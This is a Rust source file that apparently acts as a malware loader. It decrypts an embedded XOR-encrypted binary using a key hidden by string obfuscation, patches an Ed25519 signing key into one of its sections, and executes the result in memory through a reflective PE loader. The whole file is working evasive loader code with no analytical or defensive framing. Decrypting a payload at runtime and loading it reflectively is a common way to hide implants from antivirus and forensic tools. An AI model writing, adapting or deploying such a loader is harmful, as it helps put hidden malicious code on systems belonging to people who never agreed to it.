use object::{Object as _, ObjectSection as _};

fn get_section(file: &object::File, name: &str) -> Option<(u64, u64)> {
    file.sections()
        .find(|section| section.name() == Ok(name))
        .map(|section| section.file_range())
        .flatten()
}

fn set_secret_key(
    buf: &mut [u8],
    section_name: &str,
    secret_key: &[u8; common::crypto::ED25519_SECRET_KEY_SIZE],
) -> Result<(), Box<dyn std::error::Error>> {
    let file = object::File::parse(&*buf)?;
    if let Some((offset, size)) = get_section(&file, section_name) {
        assert_eq!(size, common::crypto::ED25519_SECRET_KEY_SIZE as u64);
        let base = offset as usize;
        buf[base..(base + common::crypto::ED25519_SECRET_KEY_SIZE)].copy_from_slice(secret_key);
    }
    Ok(())
}

fn decrypt_data(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut decrypted_data = Vec::with_capacity(data.len());

    for (i, &byte) in data.iter().enumerate() {
        let key_byte = key[i % key.len()];
        decrypted_data.push(byte ^ key_byte);
    }

    decrypted_data
}

fn main() {
    let encrypted = include_bytes!(concat!(env!("OUT_DIR"), "/enc"));
    let mut decrypted = decrypt_data(
        encrypted,
        obfstr::obfstr!("ABCDEFGHIKLMNOPQRSTVXYZ").as_bytes(),
    );
    set_secret_key(
        &mut decrypted,
        "secret_key",
        common::crypto::get_signing_key().as_bytes(),
    )
    .unwrap();
    unsafe { rspe::reflective_loader(decrypted) }
}
